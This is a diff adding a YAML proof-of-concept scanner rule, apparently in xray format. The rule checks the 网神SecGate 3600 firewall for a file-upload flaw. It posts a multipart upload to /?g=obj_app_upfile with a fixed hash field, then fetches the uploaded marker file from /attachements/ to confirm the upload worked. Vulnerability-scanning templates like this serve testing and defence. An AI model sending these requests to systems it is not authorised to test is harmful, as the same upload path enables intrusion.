@@ -1,0 +1,21 @@
+name: poc-yaml-netgod-firewall-rce
+rules:
+    - method: POST
+      path: /?g=obj_app_upfile
+      headers:
+          Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
+      body: "------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name=\"upfile\"; filename=\"1314520.txts\"\r\nContent-Type: text/plain\r\n\r\n1314520\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name=\"submit_post\"\r\n\r\nobj_app_upfile\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name=\"__hash__\"\r\n\r\n0b9d6b1ab7479ab69d9f71b05e0e9445\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc--"
+      expression: |
+        response.body.bcontains(b'1314520.txts') && response.body.bcontains(b'successfully')
+    - method: GET
+      path: /attachements/1314520.txts
+      follow_redirects: false
+      expression: |
+        response.status == 200 && response.body.bcontains(b'1314520')
+        
+detail:
+    author: netgod-firewall-rce
+    links:
+        - 网神SecGate 3600防火墙
+        - fid="1Lh1LHi6yfkhiO83I59AYg=="
+
